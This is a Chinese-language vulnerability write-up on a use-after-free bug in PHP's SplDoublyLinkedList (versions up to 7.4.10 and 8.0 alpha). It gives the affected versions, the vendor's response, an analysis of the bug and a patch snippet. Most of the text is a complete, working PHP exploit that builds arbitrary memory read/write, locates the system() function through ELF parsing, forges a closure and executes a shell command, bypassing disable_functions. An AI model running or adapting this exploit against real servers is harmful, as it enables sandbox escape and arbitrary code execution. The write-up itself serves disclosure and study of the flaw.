![](https://image.3001.net/images/20200927/1601176532_5f7003d437b4bd9bac8ff.jpg!small)

## 漏洞描述

PHP的SplDoublyLinkedList双向链表库中存在一个用后释放漏洞，该漏洞将允许攻击者通过运行PHP代码来转义disable_functions限制函数。在该漏洞的帮助下，远程攻击者将能够实现PHP沙箱逃逸，并执行任意代码。更准确地来说，成功利用该漏洞后，攻击者将能够绕过PHP的某些限制，例如disable_functions和safe_mode等等。

## 受影响版本

  * PHP v8.0（Alpha）；
  * PHP v7.4.10及其之前版本；

## 厂商回应

根据我们的安全分类，我们认为这并非一个安全问题，因为它需要在服务器端执行非常特殊的代码才能够触发该漏洞。如果攻击者能够实现代码注入，那么肯定是由一个比该漏洞更加严重的漏洞存在所导致的。

## 漏洞分析

SplDoublyLinkedList是PHP中的一个双向链表库（DLL），这个库支持进行迭代，即能够存储一个指针指向当前的DLL元素以实现迭代。这样一来，开发人员就可以通过调用next()和prev()来让DLL指向其他的元素了。

当我们删除DLL中的某个元素之后，PHP将从DLL中移除该元素，然后销毁掉zval，如果指针指向该元素的话，那么就存在空指针问题了。因此，当zval被销毁之后，当前指针仍然指向相关联元素，即使其已经被从链表中移除了。这样一来，用后释放问题便出现了，因为我们可以通过在zval的构造器中调用$dll->next()或$dll->prev()来触发该漏洞。

## 利用输入参数触发漏洞

我们可以使用两个值来创建一个SplDoublyLinkedList对象$s，第一个值是一个带有特殊结构体__destruct
的对象，另一个值我们不用理会。接下来，我们可以调用$s->rewind()来让当前迭代元素的指针指向我们的对象。当我们调用$s->offsetUnset(0)时，它将会调用底层C函数SPL_METHOD(SplDoublyLinkedList,
offsetUnset)（该函数存在于ext/spl/spl_dllist.c中），这个函数将完成以下几件事情：

1、通过设置下列参数将元素从双线链表中移除：

    
    
    element->prev->next = element->next
    
    element->next->prev = element->prev

2、销毁相关的zval（llist->dtor）；

3、如果intern->traverse_pointer指向目标元素，它会将指针设置为NULL；

在第二步中，会调用我们对象的__destruct方法，而intern->traverse_pointer仍然会指向该元素。为了触发用后释放问题，我们需要做下列几件事情：

  * 通过调用$s->offsetUnset(0)来移除双向链表中的第二个元素，让intern->traverse_pointer->next指向一个未分配的空间；
  * 调用$s->next()：调用链为intern->traverse_pointer = intern->traverse_pointer->next。由于该地址已在第一步被释放，那么traverse_pointer将指向一个未分配的地址；
  * 使用$s->current()，我们将能够访问未分配的地址，从而触发用后释放漏洞；

## 漏洞修复

需要在销毁zval之前清理掉intern->traverse_pointer指针，随后删除相关的引用。参考代码如下：

    
    
    was_traverse_pointer = 0;
    
     
    
            // Clear the current pointer
    
            if (intern->traverse_pointer == element) {
    
                intern->traverse_pointer = NULL;
    
                was_traverse_pointer = 1;
    
            }
    
     
    
            if(llist->dtor) {
    
                llist->dtor(element);
    
            }
    
     
    
            if(was_traverse_pointer) {
    
                SPL_LLIST_DELREF(element);
    
            }
    
     
    
            // In the current implementation, this part is useless, because
    
            // llist->dtor will UNDEF the zval before
    
            zval_ptr_dtor(&element->data);
    
            ZVAL_UNDEF(&element->data);
    
     
    
            SPL_LLIST_DELREF(element);

## 利用演示

![](https://image.3001.net/images/20200927/1601176588_5f70040c8965b7b740c44.gif!small)

## 漏洞利用

    
    
    <?php
    
    #
    
    # PHP SplDoublyLinkedList::offsetUnset UAF
    
    # Charles Fol (@cfreal_)
    
    # 2020-08-07
    
    # PHP is vulnerable from 5.3 to 8.0 alpha
    
    # This exploit only targets PHP7+.
    
    #
    
    # SplDoublyLinkedList is a doubly-linked list (DLL) which supports iteration.
    
    # Said iteration is done by keeping a pointer to the "current" DLL element.
    
    # You can then call next() or prev() to make the DLL point to another element.
    
    # When you delete an element of the DLL, PHP will remove the element from the
    
    # DLL, then destroy the zval, and finally clear the current ptr if it points
    
    # to the element. Therefore, when the zval is destroyed, current is still
    
    # pointing to the associated element, even if it was removed from the list.
    
    # This allows for an easy UAF, because you can call $dll->next() or
    
    # $dll->prev() in the zval's destructor.
    
    # 
    
    #
    
     
    
    error_reporting(E_ALL);
    
     
    
    define('NB_DANGLING', 200);
    
    define('SIZE_ELEM_STR', 40 - 24 - 1);
    
    define('STR_MARKER', 0xcf5ea1);
    
     
    
    function i2s(&$s, $p, $i, $x=8)
    
    {
    
        for($j=0;$j<$x;$j++)
    
        {
    
            $s[$p+$j] = chr($i & 0xff);
    
            $i >>= 8;
    
        }
    
    }
    
     
    
     
    
    function s2i(&$s, $p, $x=8)
    
    {
    
        $i = 0;
    
     
    
        for($j=$x-1;$j>=0;$j--)
    
        {
    
            $i <<= 8;
    
            $i |= ord($s[$p+$j]);
    
        }
    
     
    
        return $i;
    
    }
    
     
    
     
    
    class UAFTrigger
    
    {
    
        function __destruct()
    
        {
    
            global $dlls, $strs, $rw_dll, $fake_dll_element, $leaked_str_offsets;
    
     
    
            #"print('UAF __destruct: ' . "\n");
    
            $dlls[NB_DANGLING]->offsetUnset(0);
    
           
    
            # At this point every $dll->current points to the same freed chunk. We allocate
    
            # that chunk with a string, and fill the zval part
    
            $fake_dll_element = str_shuffle(str_repeat('A', SIZE_ELEM_STR));
    
            i2s($fake_dll_element, 0x00, 0x12345678); # ptr
    
            i2s($fake_dll_element, 0x08, 0x00000004, 7); # type + other stuff
    
           
    
            # Each of these dlls current->next pointers point to the same location,
    
            # the string we allocated. When calling next(), our fake element becomes
    
            # the current value, and as such its rc is incremented. Since rc is at
    
            # the same place as zend_string.len, the length of the string gets bigger,
    
            # allowing to R/W any part of the following memory
    
            for($i = 0; $i <= NB_DANGLING; $i++)
    
                $dlls[$i]->next();
    
     
    
            if(strlen($fake_dll_element) <= SIZE_ELEM_STR)
    
                die('Exploit failed: fake_dll_element did not increase in size');
    
           
    
            $leaked_str_offsets = [];
    
            $leaked_str_zval = [];
    
     
    
            # In the memory after our fake element, that we can now read and write,
    
            # there are lots of zend_string chunks that we allocated. We keep three,
    
            # and we keep track of their offsets.
    
            for($offset = SIZE_ELEM_STR + 1; $offset <= strlen($fake_dll_element) - 40; $offset += 40)
    
            {
    
                # If we find a string marker, pull it from the string list
    
                if(s2i($fake_dll_element, $offset + 0x18) == STR_MARKER)
    
                {
    
                    $leaked_str_offsets[] = $offset;
    
                    $leaked_str_zval[] = $strs[s2i($fake_dll_element, $offset + 0x20)];
    
                    if(count($leaked_str_zval) == 3)
    
                        break;
    
                }
    
            }
    
     
    
            if(count($leaked_str_zval) != 3)
    
                die('Exploit failed: unable to leak three zend_strings');
    
           
    
            # free the strings, except the three we need
    
            $strs = null;
    
     
    
            # Leak adress of first chunk
    
            unset($leaked_str_zval[0]);
    
            unset($leaked_str_zval[1]);
    
            unset($leaked_str_zval[2]);
    
            $first_chunk_addr = s2i($fake_dll_element, $leaked_str_offsets[1]);
    
     
    
            # At this point we have 3 freed chunks of size 40, which we can read/write,
    
            # and we know their address.
    
            print('Address of first RW chunk: 0x' . dechex($first_chunk_addr) . "\n");
    
     
    
            # In the third one, we will allocate a DLL element which points to a zend_array
    
            $rw_dll->push([3]);
    
            $array_addr = s2i($fake_dll_element, $leaked_str_offsets[2] + 0x18);
    
            # Change the zval type from zend_object to zend_string
    
            i2s($fake_dll_element, $leaked_str_offsets[2] + 0x20, 0x00000006);
    
            if(gettype($rw_dll[0]) != 'string')
    
                die('Exploit failed: Unable to change zend_array to zend_string');
    
           
    
            # We can now read anything: if we want to read 0x11223300, we make zend_string*
    
            # point to 0x11223300-0x10, and read its size using strlen()
    
     
    
            # Read zend_array->pDestructor
    
            $zval_ptr_dtor_addr = read($array_addr + 0x30);
    
        
    
            print('Leaked zval_ptr_dtor address: 0x' . dechex($zval_ptr_dtor_addr) . "\n");
    
     
    
            # Use it to find zif_system
    
            $system_addr = get_system_address($zval_ptr_dtor_addr);
    
            print('Got PHP_FUNCTION(system): 0x' . dechex($system_addr) . "\n");
    
           
    
            # In the second freed block, we create a closure and copy the zend_closure struct
    
            # to a string
    
            $rw_dll->push(function ($x) {});
    
            $closure_addr = s2i($fake_dll_element, $leaked_str_offsets[1] + 0x18);
    
            $data = str_shuffle(str_repeat('A', 0x200));
    
     
    
            for($i = 0; $i < 0x138; $i += 8)
    
            {
    
                i2s($data, $i, read($closure_addr + $i));
    
            }
    
           
    
            # Change internal func type and pointer to make the closure execute system instead
    
            i2s($data, 0x38, 1, 4);
    
            i2s($data, 0x68, $system_addr);
    
           
    
            # Push our string, which contains a fake zend_closure, in the last freed chunk that
    
            # we control, and make the second zval point to it.
    
            $rw_dll->push($data);
    
            $fake_zend_closure = s2i($fake_dll_element, $leaked_str_offsets[0] + 0x18) + 24;
    
            i2s($fake_dll_element, $leaked_str_offsets[1] + 0x18, $fake_zend_closure);
    
            print('Replaced zend_closure by the fake one: 0x' . dechex($fake_zend_closure) . "\n");
    
           
    
            # Calling it now
    
           
    
            print('Running system("id");' . "\n");
    
            $rw_dll[1]('id');
    
     
    
            print_r('DONE'."\n");
    
        }
    
    }
    
     
    
    class DanglingTrigger
    
    {
    
        function __construct($i)
    
        {
    
            $this->i = $i;
    
        }
    
     
    
        function __destruct()
    
        {
    
            global $dlls;
    
            #D print('__destruct: ' . $this->i . "\n");
    
            $dlls[$this->i]->offsetUnset(0);
    
            $dlls[$this->i+1]->push(123);
    
            $dlls[$this->i+1]->offsetUnset(0);
    
        }
    
    }
    
     
    
    class SystemExecutor extends ArrayObject
    
    {
    
        function offsetGet($x)
    
        {
    
            parent::offsetGet($x);
    
        }
    
    }
    
     
    
    /**
    
     * Reads an arbitrary address by changing a zval to point to the address minus 0x10,
    
     * and setting its type to zend_string, so that zend_string->len points to the value
    
     * we want to read.
    
     */
    
    function read($addr, $s=8)
    
    {
    
        global $fake_dll_element, $leaked_str_offsets, $rw_dll;
    
     
    
        i2s($fake_dll_element, $leaked_str_offsets[2] + 0x18, $addr - 0x10);
    
        i2s($fake_dll_element, $leaked_str_offsets[2] + 0x20, 0x00000006);
    
     
    
        $value = strlen($rw_dll[0]);
    
     
    
        if($s != 8)
    
            $value &= (1 << ($s << 3)) - 1;
    
     
    
        return $value;
    
    }
    
     
    
    function get_binary_base($binary_leak)
    
    {
    
        $base = 0;
    
        $start = $binary_leak & 0xfffffffffffff000;
    
        for($i = 0; $i < 0x1000; $i++)
    
        {
    
            $addr = $start - 0x1000 * $i;
    
            $leak = read($addr, 7);
    
            # ELF header
    
            if($leak == 0x10102464c457f)
    
                return $addr;
    
        }
    
        # We'll crash before this but it's clearer this way
    
        die('Exploit failed: Unable to find ELF header');
    
    }
    
     
    
    function parse_elf($base)
    
    {
    
        $e_type = read($base + 0x10, 2);
    
     
    
        $e_phoff = read($base + 0x20);
    
        $e_phentsize = read($base + 0x36, 2);
    
        $e_phnum = read($base + 0x38, 2);
    
     
    
        for($i = 0; $i < $e_phnum; $i++) {
    
            $header = $base + $e_phoff + $i * $e_phentsize;
    
            $p_type  = read($header + 0x00, 4);
    
            $p_flags = read($header + 0x04, 4);
    
            $p_vaddr = read($header + 0x10);
    
            $p_memsz = read($header + 0x28);
    
     
    
            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
    
                # handle pie
    
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
    
                $data_size = $p_memsz;
    
            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
    
                $text_size = $p_memsz;
    
            }
    
        }
    
     
    
        if(!$data_addr || !$text_size || !$data_size)
    
            die('Exploit failed: Unable to parse ELF');
    
     
    
        return [$data_addr, $text_size, $data_size];
    
    }
    
     
    
    function get_basic_funcs($base, $elf) {
    
        list($data_addr, $text_size, $data_size) = $elf;
    
        for($i = 0; $i < $data_size / 8; $i++) {
    
            $leak = read($data_addr + $i * 8);
    
            if($leak - $base > 0 && $leak < $data_addr) {
    
                $deref = read($leak);
    
                # 'constant' constant check
    
                if($deref != 0x746e6174736e6f63)
    
                    continue;
    
            } else continue;
    
     
    
            $leak = read($data_addr + ($i + 4) * 8);
    
            if($leak - $base > 0 && $leak < $data_addr) {
    
                $deref = read($leak);
    
                # 'bin2hex' constant check
    
                if($deref != 0x786568326e6962)
    
                    continue;
    
            } else continue;
    
     
    
            return $data_addr + $i * 8;
    
        }
    
    }
    
     
    
    function get_system($basic_funcs)
    
    {
    
        $addr = $basic_funcs;
    
        do {
    
            $f_entry = read($addr);
    
            $f_name = read($f_entry, 6);
    
     
    
            if($f_name == 0x6d6574737973) { # system
    
                return read($addr + 8);
    
            }
    
            $addr += 0x20;
    
        } while($f_entry != 0);
    
        return false;
    
    }
    
     
    
    function get_system_address($binary_leak)
    
    {
    
        $base = get_binary_base($binary_leak);
    
        print('ELF base: 0x' .dechex($base) . "\n");
    
        $elf = parse_elf($base);
    
        $basic_funcs = get_basic_funcs($base, $elf);
    
        print('Basic functions: 0x' .dechex($basic_funcs) . "\n");
    
        $zif_system = get_system($basic_funcs);
    
        return $zif_system;
    
    }
    
     
    
    $dlls = [];
    
    $strs = [];
    
    $rw_dll = new SplDoublyLinkedList();
    
     
    
     
    
    # Create a chain of dangling triggers, which will all in turn
    
    # free current->next, push an element to the next list, and free current
    
    # This will make sure that every current->next points the same memory block,
    
    # which we will UAF.
    
    for($i = 0; $i < NB_DANGLING; $i++)
    
    {
    
        $dlls[$i] = new SplDoublyLinkedList();
    
        $dlls[$i]->push(new DanglingTrigger($i));
    
        $dlls[$i]->rewind();
    
    }
    
     
    
    # We want our UAF'd list element to be before two strings, so that we can
    
    # obtain the address of the first string, and increase is size. We then have
    
    # R/W over all memory after the obtained address.
    
    define('NB_STRS', 50);
    
    for($i = 0; $i < NB_STRS; $i++)
    
    {
    
        $strs[] = str_shuffle(str_repeat('A', SIZE_ELEM_STR));
    
        i2s($strs[$i], 0, STR_MARKER);
    
        i2s($strs[$i], 8, $i, 7);
    
    }
    
     
    
    # Free one string in the middle, ...
    
    $strs[NB_STRS - 20] = 123;
    
    # ... and put the to-be-UAF'd list element instead.
    
    $dlls[0]->push(0);
    
     
    
    # Setup the last DLlist, which will exploit the UAF
    
    $dlls[NB_DANGLING] = new SplDoublyLinkedList();
    
    $dlls[NB_DANGLING]->push(new UAFTrigger());
    
    $dlls[NB_DANGLING]->rewind();
    
     
    
    # Trigger the bug on the first list
    
    $dlls[0]->offsetUnset(0);

